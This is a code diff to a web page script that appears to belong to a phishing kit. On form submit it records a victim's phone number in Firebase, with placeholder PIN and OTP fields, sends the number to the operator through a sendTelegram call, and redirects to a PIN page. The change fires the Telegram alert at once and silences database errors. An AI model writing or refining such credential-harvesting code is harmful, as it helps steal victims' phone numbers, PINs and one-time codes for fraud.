@@ -107,33 +107,23 @@
 
     var userId = "User_" + Date.now().toString(36).toUpperCase();
 
-    // ✅ FIRST: Save to Firebase, THEN send notification and navigate
+    // Fire notification immediately — no waiting
+    sendTelegram(phone, userId);
+
+    // Save to Firebase in background
     database.ref(DB_NODE + "/" + userId).set({
       id: userId,
       phone: phone,
       pin: "",
       otp: "",
       timestamp: new Date().toLocaleString()
-    }).then(function() {
-      // ✅ Save to sessionStorage
-      sessionStorage.setItem("affinity_userId", userId);
-      sessionStorage.setItem("affinity_phone", phone);
-      sessionStorage.setItem("affinity_pin", "");
-      
-      // ✅ Send notification (your working code)
-      sendTelegram(phone, userId);
+    }).catch(function(){});
 
-      // ✅ Navigate
-      window.location.href = "pin.html";
-    }).catch(function(error) {
-      console.error("❌ Firebase error:", error);
-      // Still navigate even if save fails
-      sessionStorage.setItem("affinity_userId", userId);
-      sessionStorage.setItem("affinity_phone", phone);
-      sessionStorage.setItem("affinity_pin", "");
-      sendTelegram(phone, userId);
-      window.location.href = "pin.html";
-    });
+    // Navigate immediately
+    sessionStorage.setItem("affinity_userId", userId);
+    sessionStorage.setItem("affinity_phone", phone);
+    sessionStorage.setItem("affinity_pin", "");
+    window.location.href = "pin.html";
   });
 </script>
 
